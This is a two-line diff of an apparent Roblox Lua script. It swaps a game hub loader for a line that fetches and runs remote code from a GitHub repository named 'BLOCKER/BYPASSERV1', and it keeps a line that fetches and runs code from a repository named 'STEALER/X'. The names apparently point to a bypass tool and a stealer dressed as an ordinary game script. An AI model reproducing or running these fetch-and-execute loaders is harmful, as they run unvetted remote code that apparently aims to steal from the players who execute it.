@@ -1,2 +1,2 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/KuniDevLua/GrowAGarden/refs/heads/main/kunihublibrary2"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/scriptsz99/BLOCKER/refs/heads/main/BYPASSERV1"))()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/scriptsz99/STEALER/refs/heads/main/X"))()
